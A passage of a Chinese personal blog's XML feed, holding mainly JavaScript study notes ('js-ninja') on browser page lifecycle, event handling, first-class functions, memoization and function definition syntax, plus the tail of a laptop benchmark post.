&lt;td&gt;8x2 32000Hz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SSD&lt;/td&gt;
&lt;td&gt;512GB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Monitor&lt;/td&gt;
&lt;td&gt;14inch 2.2k&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wifi&lt;/td&gt;
&lt;td&gt;Intel AX200&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Battery&lt;/td&gt;
&lt;td&gt;61Wh&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;CPU性能测试&quot;&gt;&lt;a href=&quot;#CPU性能测试&quot; class=&quot;headerlink&quot; title=&quot;CPU性能测试&quot;&gt;&lt;/a&gt;CPU性能测试&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;cinebench r20 单/双核&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/posts/69d0feff/1.png&quot; height=&quot;300&quot;&gt;

&lt;blockquote&gt;
&lt;p&gt;结果和B站上的评测差不多，但和cpu-monkey上5000+的成绩有不小差距&lt;/p&gt;
&lt;p&gt;在实际体验上和之前的8559U有了涨足的进步，但似乎仍却不如台式上的3500X打开网页那么顺滑，也许和内存也有关系吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;gpu性能测试&quot;&gt;&lt;a href=&quot;#gpu性能测试&quot; class=&quot;headerlink&quot; title=&quot;gpu性能测试&quot;&gt;&lt;/a&gt;gpu性能测试&lt;/h3&gt;</summary>
    
    
    
    <category term="雜玩" scheme="https://hejueyun.github.io/categories/funfair/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>js-ninja</title>
    <link href="https://hejueyun.github.io/posts/c579fa28/"/>
    <id>https://hejueyun.github.io/posts/c579fa28/</id>
    <published>2021-03-25T13:47:51.000Z</published>
    <updated>2021-04-25T07:09:09.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-JS使用环境"><a href="#1-JS使用环境" class="headerlink" title="1. JS使用环境"></a>1. JS使用环境</h2><p>由于<strong>更先进的JvaScript engines和frameeworks（ Node,  Apache  Cordova,  Ionic,  and  Electron）</strong>的发明，JS几乎可以做任何事 </p><h3 id="JS是更为面向函数的（functionally-oriented）"><a href="#JS是更为面向函数的（functionally-oriented）" class="headerlink" title="JS是更为面向函数的（functionally oriented）"></a>JS是<strong>更为面向函数的（functionally oriented）</strong></h3><ul><li>函数可被视为对象<ul><li>可以被常量创建</li><li>被变量引用</li><li>被当作函数变量传递</li><li>被作为返回值返回</li></ul></li><li>支持函数闭包<ul><li>当一个函数主动地保存一个外部变量就可将<strong>这个函数</strong>称为闭包</li></ul></li><li>作用域<ul><li>JS不像C++那样有<strong>块级（block-level  variables ）</strong>作用域</li><li>只用<strong>全局</strong>和<strong>函数</strong>两种级别的作用域</li></ul></li><li><strong>基于原型的面向对象（Prototype-based  object  orientation）</strong><ul><li>区别于<strong>基于类的（Class-based）</strong><ul><li>最主要的区别：Class中，类和实例不同；Prototype中，凡对象均为实例</li></ul></li></ul></li></ul><h3 id="JS需要关注的特性"><a href="#JS需要关注的特性" class="headerlink" title="JS需要关注的特性"></a>JS需要关注的特性</h3><ul><li>生成器（generator）<ul><li>类似Python，即一个可以在两个请求之间暂停的<strong>函数</strong></li></ul></li><li>约定（promise）<ul><li>更好地控制<strong>异步代码</strong></li></ul></li><li>代理（proxy）<ul><li>控制对特定对象的<strong>访问</strong></li></ul></li><li>高级数组方法（advanced array methods）</li><li>哈希（map）</li><li>正则式（regular expression）</li><li>模块（module）</li></ul><h3 id="JS演进"><a href="#JS演进" class="headerlink" title="JS演进"></a>JS演进</h3><ul><li>ECMAScript委员发布新版本，比如(ES7/ES2016)<ul><li>注意这只是<strong>标准</strong>的更新，要实际运用得等到JS引擎更新才行</li><li>但不同于Python，js引擎是由用户浏览器决定的</li><li>所以需要<strong>转译器</strong>（transpiler，又称<strong>源代码到源代码编译器</strong>source-to-source compile，<strong>翻译器</strong>transcompiler）<blockquote><p>以某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器</p><p>For example, converting C++ code to C code will involve a transpiler.</p></blockquote></li><li>在这个语境下，是指将高端的JS代码转换为等效兼容的JS代码</li></ul></li></ul><h3 id="浏览器工作原理"><a href="#浏览器工作原理" class="headerlink" title="浏览器工作原理"></a>浏览器工作原理</h3><img src="/posts/c579fa28/2021-03-26-14-29-07.png" width height="300"><blockquote><p>The DOM  is  a  structured  representation  of the <strong>UI</strong>  of  a  client-side  web  application</p></blockquote><ul><li>根据DOM-JS来说，DOM本质就是将HTML(<strong>Document</strong>)文本理解为对象(<strong>Object</strong>)，并以节点树的方式组织(<strong>Model</strong>)。</li></ul><h3 id="调试、测试、性能分析"><a href="#调试、测试、性能分析" class="headerlink" title="调试、测试、性能分析"></a>调试、测试、性能分析</h3><p>调试</p><ul><li>dev tool<br>测试</li><li>assert<br>性能分析</li><li>console对象内置方法<code>time</code>和<code>timeEnd</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.time(<span class="string">&quot;begin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; maxcount; i++ )&#123;</span><br><span class="line">    <span class="comment">// operation. </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>单步操作太快所以用循坏来增加时间，以体现差异</li><li>console对象的结果显示在控制台上</li></ul><h3 id="JS跨平台"><a href="#JS跨平台" class="headerlink" title="JS跨平台"></a>JS跨平台</h3><ul><li>桌面级应用<ul><li>NW.js</li><li>Electron</li></ul></li><li>移动应用框架<ul><li>Apache   Cordova </li></ul></li><li>服务端应用<ul><li>Node.js</li></ul></li></ul><h2 id="2-在运行时构建页面"><a href="#2-在运行时构建页面" class="headerlink" title="2. 在运行时构建页面"></a>2. 在运行时构建页面</h2><p><em>How many events can a web application handle at once?</em></p><h3 id="浏览器周期"><a href="#浏览器周期" class="headerlink" title="浏览器周期"></a>浏览器周期</h3><img src="/posts/c579fa28/2021-03-26-15-13-33.png" width height="300"><p><strong>更为宏观</strong>的看：浏览器本质上是一个<strong>GUI应用</strong>，所以它的生命周期也和其他GUI应用一样分为两步</p><ul><li>页面加载，绘制用户界面（UI）</li><li>进入事件循环，并开始调用事件句柄（handler）</li></ul><img src="/posts/c579fa28/2021-03-26-15-21-20.png" width height="150"><h4 id="页面加载阶段"><a href="#页面加载阶段" class="headerlink" title="页面加载阶段"></a>页面加载阶段</h4><ul><li>解析HTML并构建DOM</li><li>执行JS代码<br>在页面加载阶段，这两步骤可反复横跳</li></ul><img src="/posts/c579fa28/2021-03-26-16-30-59.png" width height="200"><h5 id="解析HTML并构建DOM"><a href="#解析HTML并构建DOM" class="headerlink" title="解析HTML并构建DOM"></a>解析HTML并构建DOM</h5><p>HTML vs DOM</p><ul><li>HTML相当于DOM初始化页面的<strong>蓝图（blue print）</strong><ul><li>浏览器再构建DOM时可以对蓝图中的错误进行纠正</li></ul></li></ul><img src="/posts/c579fa28/2021-03-26-16-42-06.png" width height="300"><blockquote><p>The intention of the head element is that it isused  for  providing  general  page  information:  for  example,  the  page  title,  characterencodings, and external styles and scripts. It isn’t intended for defining page content,as in this example. Because this is an error, the browser silently fixes it by constructingthe correct DOM</p></blockquote><h5 id="执行JS代码"><a href="#执行JS代码" class="headerlink" title="执行JS代码"></a>执行JS代码</h5><p>在解析HTML时，当遇到script元素时，<strong>浏览器</strong>停止DOM构造并开始执行JS代码</p><ul><li>浏览器通过<strong>全局对象</strong>来提供API<ul><li><code>windows</code>对象作为一个全局对象的同时，还可以访问其他<strong>全局对象</strong>、<strong>全局变量</strong>以及<strong>API</strong></li><li><code>windows</code>对象最重要的<strong>属性</strong>是<code>document</code></li></ul></li></ul><h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h4><p>页面加载阶段完成后，进入时间处理阶段</p><ul><li>GUI应用需要应对各式各样的事件，比如鼠标点击、键盘键入等</li><li>浏览器是<strong>单线程执行</strong>的，因此需要事件队列<blockquote><p>queued up as they occur and are processed as the single thread of execution allows</p></blockquote></li></ul><img src="/posts/c579fa28/2021-03-27-16-54-05.png" width height="300"><ul><li>注意事件的来源是多样的：比如client-side，鼠标点击；也可以是server-side，比如Ajax事件<ul><li>两者共同被放入同一队列中</li></ul></li><li>web应用未响应可能就是卡壳在上一个事件处理线程上</li><li>注意，将事件放入队列这一浏览器机制是独立于 页面加载 与 事件循环 两个阶段的</li></ul><h5 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h5><p>event类型</p><ul><li>浏览器事件</li><li>网络事件</li><li>用户事件</li><li>计时器事件</li></ul><p>异步</p><ul><li>即双方不需要共同的时钟，也就是接收方不知道发送方什么时候发送</li></ul><h5 id="handle句柄-vs-handler处理函数"><a href="#handle句柄-vs-handler处理函数" class="headerlink" title="handle句柄 vs handler处理函数"></a>handle句柄 vs handler处理函数</h5><ul><li>A <code>handle</code>  is an abstract reference to a resource. Handle是对某个资源的抽象引用。</li><li>A <code>handler</code> is an asynchronous callback subroutine. Handler则是一个异步的回调函数(子程序)<blockquote><p> <code>event handlers</code> are <strong>functions</strong> that we want executed whenever a particular event occurs</p></blockquote></li></ul><h5 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h5><p>为了调用事件处理函数，我们需要在事件发生时通知浏览器，即<code>event-handler registration</code></p><ul><li>将函数赋值给对象的属性<ul><li><code>windows.onload=function()&#123;&#125;</code></li></ul></li><li>用内置<code>addEventListener</code>方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">&quot;mousemove&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</span><br></pre></td></tr></table></figure><img src="/posts/c579fa28/2021-03-27-20-15-39.png" width height="350"><h2 id="3-头等函数"><a href="#3-头等函数" class="headerlink" title="3. 头等函数"></a>3. 头等函数</h2><p>First-class Function</p><blockquote><p>当一门编程语言的函数可以被当作变量一样用时，则称这门语言拥有头等函数。例如，在这门语言中，函数可以被当作参数传递给其他函数，可以作为另一个函数的返回值，还可以被赋值给一个变量</p></blockquote><h3 id="作为头等对象的函数"><a href="#作为头等对象的函数" class="headerlink" title="作为头等对象的函数"></a>作为头等对象的函数</h3><ul><li><p>通过字面量<code>&#123;&#125;</code>创建</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br></pre></td></tr></table></figure></li><li><p>赋值给变量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test=&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">test.push(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</span><br></pre></td></tr></table></figure></li><li><p>能够参数传递，或作为返回值</p></li><li><p>能够<strong>具有属性</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test=&#123;&#125;</span><br><span class="line">test.name=abc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> test=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">test.name=abd;</span><br></pre></td></tr></table></figure></li><li><p>正因如此，<strong>头等函数</strong>可被视为对象的一种</p></li></ul><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p>一个在将来会被<strong>调用</strong>的<strong>函数</strong>被称为回调函数，无论它之后是被其他函数还是浏览器本身调用</p><blockquote><p>回调（Callback 即call then back <strong>被主函数调用运算后会返回主函数</strong>），是指通过参数将函数传递到其它代码的，某一块可执行代码的引用</p></blockquote><ul><li><em>特征：通过参数将函数传递到其它函数中</em></li></ul><img src="/posts/c579fa28/2021-04-02-00-55-17.png" width height="150"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asserts(</span><br><span class="line">  useless(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">  &#125;) === test,</span><br><span class="line">  <span class="string">&quot;Success.&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>匿名函数作为回调函数</li><li>回调函数相对于主调函数既可以是同步的（比如上例），也可以是异步的（比如在某一特定event下才被调用）</li></ul><h3 id="作为对象的函数"><a href="#作为对象的函数" class="headerlink" title="作为对象的函数"></a>作为对象的函数</h3><h4 id="如何存储函数"><a href="#如何存储函数" class="headerlink" title="如何存储函数"></a>如何存储函数</h4><ul><li>最为基础的方法：将函数们存为数组然后循环遍历去重</li><li>更为高阶的方法：利用函数属性<ul><li>本质上来说也就是从o(n)的数组换成o(1)的字典</li></ul></li></ul><img src="/posts/c579fa28/2021-04-03-13-13-09.png" width height="250"><ul><li><code>属性: 值</code>，定义对象的属性</li><li>这段代码相当于初始化一个id函数的id属性并纳入cache中存储</li></ul><h4 id="自记忆化-self-memoizing-的函数"><a href="#自记忆化-self-memoizing-的函数" class="headerlink" title="自记忆化(self-memoizing)的函数"></a>自记忆化(self-memoizing)的函数</h4><ul><li>相当于生成器<blockquote><p><em>memoization</em> is the process of building a func-tion  that’s  capable  of  remembering  its  previously  computed  values. </p></blockquote></li><li>减少重复计算</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPrime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// create cache</span></span><br><span class="line">  <span class="keyword">if</span> (!isPrime.answers) &#123;</span><br><span class="line">    isPrime.answers = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// checks for cached values</span></span><br><span class="line">  <span class="keyword">if</span> (isPrime.answers[value] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> isPrime.answers[value];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> prime = value !== <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2</span>; i &lt; value; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (value % i === <span class="number">0</span>) &#123;</span><br><span class="line">      prime = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Stores the computed value</span></span><br><span class="line">  <span class="keyword">return</span> isPrime.answers[value] = prime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">assert(isPrime(<span class="number">5</span>), <span class="string">&quot;5 is prime!&quot;</span>);</span><br><span class="line">assert(isPrime.answers[<span class="number">5</span>], <span class="string">&quot;The answer was cached!&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><code>==</code> vs <code>===</code><ul><li><code>==</code>: 值等<blockquote><p>如果两个操作数不是同一类型时，js会尝试将其转化为合适的类型，然后进行比较</p></blockquote></li><li><code>===</code>: 值与类型皆等<blockquote><p>当左右两个操作数不是同一类型时，js不会转换其类型</p></blockquote></li></ul></li><li>首先检查函数<code>isPrime</code>是否存在<code>answers</code>属性，没有则创建</li><li>由于<code>cache</code>是函数本身的属性，因此只要函数还存在那么它就还存在</li><li><code>return isPrime.answers[value] = prime;</code>：从右到左赋值，然后返回<code>isPrime.answers[value]</code></li></ul><p>这么做的代价：</p><ul><li>将缓存与业务逻辑绑定在了一起</li></ul><h3 id="定义函数的方式"><a href="#定义函数的方式" class="headerlink" title="定义函数的方式"></a>定义函数的方式</h3><ul><li>函数声明(Function Declaration)<ul><li>定义命名的函数变量，而无需给变量赋值<ul><li><code>function myFun()&#123; return 1;&#125;</code></li></ul></li></ul></li><li>函数表达式(Function Expression )<ul><li>将函数定义为表达式语句（<strong>通常</strong>是变量赋值）的一部分。通过 Function Expression 定义的函数可以是命名的，也可以是匿名的。<blockquote><p>For  function  declarations,the  function  name  is mandatory,  whereas  for  function  expressions  it’s  completelyoptional.</p></blockquote><ul><li><code>var a = function() &#123;return 3;&#125;</code></li></ul></li></ul></li><li>箭头函数(Arrow  functions ,或称lambda函数)<ul><li>ES6加入<ul><li><code>myArg =&gt; myArg*2</code></li></ul></li></ul></li><li>函数构造器(Function constructors)<ul><li><code>new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;)</code></li></ul></li><li>生成器函数(Generator  functions)<ul><li>ES6加入</li><li>能退出并再进入，同时在这一过程中保持函数变量的值<ul><li><code>function* myGen()&#123; yield 1; &#125;</code></li></ul></li></ul></li></ul><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><img src="/posts/c579fa28/2021-04-06-13-26-07.png" width height="250"><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><img src="/posts/c579fa28/2021-04-06-13-30-27.png" width height="250"><ul><li>函数表达式定义的函数可以匿名：因为可以不用以显示的函数名字的方式来调用</li></ul><h5 id="即时函数-IMMEDIATE-FUNCTIONS"><a href="#即时函数-IMMEDIATE-FUNCTIONS" class="headerlink" title="即时函数(IMMEDIATE FUNCTIONS)"></a>即时函数(IMMEDIATE FUNCTIONS)</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 标准函数调用</span></span><br><span class="line">myFunctionName(<span class="number">3</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 即时函数调用</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;)(<span class="number">3</span>);  <span class="comment">//即时函数外侧的括号纯粹是语法要求，用于和函数声明区分</span></span><br></pre></td></tr></table></figure><ul><li>调用括号左侧的表达式不一定是一个简单的标识符(Identifier)，它可以是任何等效于函数的表达式。例如，指定一个等效为函数的表达式的简单方法是使用一个函数表达式</li><li>注意到上图中单元运算符不需要额外加括号来做区分</li></ul><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><ul><li>从某种意义上说，箭头函数即是对函数表达式的简化</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> values = [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line">values.sort(<span class="function"><span class="keyword">function</span> (<span class="params">value1, value2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value1 - value2;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">values.sort(<span class="function">(<span class="params">value1, value2</span>) =&gt;</span> value1 - value2);</span><br></pre></td></tr></table></figure><ul><li><code>=&gt;</code>又称胖箭头</li><li>语法：<code>param =&gt; expression</code><ul><li>接收参数并返回表达式的结果</li><li>如果参数个数为0或大于2，则要在<code>param</code>外加上括号，1个的话括号则为可选</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> greet = <span class="function">(<span class="params">name</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> helloString = <span class="string">&quot;Greetgings&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> helloString + name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="实参-argument-vs-形参-parameter"><a href="#实参-argument-vs-形参-parameter" class="headerlink" title="实参(argument) vs 形参(parameter)"></a>实参(argument) vs 形参(parameter)</h3><blockquote><ul><li>A <strong>parameter</strong> is a variable that we list as part of a function definition.</li><li>An <strong>argument</strong> is a value that we pass to the function when we invoke it. </li></ul></blockquote><ul><li>即：定义的是形参，传递的是实参</li></ul><h3 id="剩余参数-Rest-parameters"><a href="#剩余参数-Rest-parameters" class="headerlink" title="剩余参数(Rest parameters)"></a>剩余参数(Rest parameters)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript中的剩余参数是指函数定义时以...为前缀的参数，这个参数是一个没有对应形参的实参组成的一个数组，数组名就是剩余参数名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意“剩余参数”是一个“数组”</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num</span>(<span class="params">a,b,...arg</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(arg);</span><br><span class="line">      arg.push(a,b);</span><br><span class="line">      <span class="built_in">console</span>.log(arg);</span><br><span class="line">&#125;</span><br><span class="line">num(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>); <span class="comment">//[3,4,5]    </span></span><br><span class="line"><span class="comment">// [3,4,5,1,2]</span></span><br></pre></td></tr></table></figure><ul><li>只有最后一个函数参数能作为剩余参数</li></ul><h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFunc</span>(<span class="params">ninja, action = <span class="string">&quot;skulking&quot;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ninja + <span class="string">&quot; &quot;</span> + action;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>基本同python</li></ul><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-JS使用环境&quot;&gt;&lt;a href=&quot;#1-JS使用环境&quot; class=&quot;headerlink&quot; title=&quot;1. JS使用环境&quot;&gt;&lt;/a&gt;1. JS使用环境&lt;/h2&gt;&lt;p&gt;由于&lt;strong&gt;更先进的JvaScript engines和frameeworks（ Node,  Apache  Cordova,  Ionic,  and  Electron）&lt;/strong&gt;的发明，JS几乎可以做任何事 &lt;/p&gt;
&lt;h3 id=&quot;JS是更为面向函数的（functionally-oriented）&quot;&gt;&lt;a href=&quot;#JS是更为面向函数的（functionally-oriented）&quot; class=&quot;headerlink&quot; title=&quot;JS是更为面向函数的（functionally oriented）&quot;&gt;&lt;/a&gt;JS是&lt;strong&gt;更为面向函数的（functionally oriented）&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;函数可被视为对象&lt;ul&gt;
&lt;li&gt;可以被常量创建&lt;/li&gt;
&lt;li&gt;被变量引用&lt;/li&gt;
&lt;li&gt;被当作函数变量传递&lt;/li&gt;
&lt;li&gt;被作为返回值返回&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持函数闭包&lt;ul&gt;
&lt;li&gt;当一个函数主动地保存一个外部变量就可将&lt;strong&gt;这个函数&lt;/strong&gt;称为闭包&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;作用域&lt;ul&gt;
&lt;li&gt;JS不像C++那样有&lt;strong&gt;块级（block-level  variables ）&lt;/strong&gt;作用域&lt;/li&gt;
&lt;li&gt;只用&lt;strong&gt;全局&lt;/strong&gt;和&lt;strong&gt;函数&lt;/strong&gt;两种级别的作用域&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于原型的面向对象（Prototype-based  object  orientation）&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;区别于&lt;strong&gt;基于类的（Class-based）&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;最主要的区别：Class中，类和实例不同；Prototype中，凡对象均为实例&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;JS需要关注的特性&quot;&gt;&lt;a href=&quot;#JS需要关注的特性&quot; class=&quot;headerlink&quot; title=&quot;JS需要关注的特性&quot;&gt;&lt;/a&gt;JS需要关注的特性&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;生成器（generator）&lt;ul&gt;
&lt;li&gt;类似Python，即一个可以在两个请求之间暂停的&lt;strong&gt;函数&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;约定（promise）&lt;ul&gt;
&lt;li&gt;更好地控制&lt;strong&gt;异步代码&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;代理（proxy）&lt;ul&gt;
&lt;li&gt;控制对特定对象的&lt;strong&gt;访问&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;高级数组方法（advanced array methods）&lt;/li&gt;
&lt;li&gt;哈希（map）&lt;/li&gt;
&lt;li&gt;正则式（regular expression）&lt;/li&gt;
&lt;li&gt;模块（module）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;JS演进&quot;&gt;&lt;a href=&quot;#JS演进&quot; class=&quot;headerlink&quot; title=&quot;JS演进&quot;&gt;&lt;/a&gt;JS演进&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;ECMAScript委员发布新版本，比如(ES7/ES2016)&lt;ul&gt;
&lt;li&gt;注意这只是&lt;strong&gt;标准&lt;/strong&gt;的更新，要实际运用得等到JS引擎更新才行&lt;/li&gt;
&lt;li&gt;但不同于Python，js引擎是由用户浏览器决定的&lt;/li&gt;
&lt;li&gt;所以需要&lt;strong&gt;转译器&lt;/strong&gt;（transpiler，又称&lt;strong&gt;源代码到源代码编译器&lt;/strong&gt;source-to-source compile，&lt;strong&gt;翻译器&lt;/strong&gt;transcompiler）&lt;blockquote&gt;
&lt;p&gt;以某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器&lt;/p&gt;
&lt;p&gt;For example, converting C++ code to C code will involve a transpiler.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;在这个语境下，是指将高端的JS代码转换为等效兼容的JS代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;浏览器工作原理&quot;&gt;&lt;a href=&quot;#浏览器工作原理&quot; class=&quot;headerlink&quot; title=&quot;浏览器工作原理&quot;&gt;&lt;/a&gt;浏览器工作原理&lt;/h3&gt;&lt;img src=&quot;/posts/c579fa28/2021-03-26-14-29-07.png&quot; width height=&quot;300&quot;&gt;</summary>
    
    
    
    <category term="Program Language" scheme="https://hejueyun.github.io/categories/Program-Language/"/>
    
    <category term="Javascript" scheme="https://hejueyun.github.io/categories/Program-Language/Javascript/"/>
    
    <category term="Basic" scheme="https://hejueyun.github.io/categories/Program-Language/Javascript/Basic/"/>
    
    
    <category term="notes" scheme="https://hejueyun.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>js_DOM</title>
    <link href="https://hejueyun.github.io/posts/3dae438f/"/>
    <id>https://hejueyun.github.io/posts/3dae438f/</id>
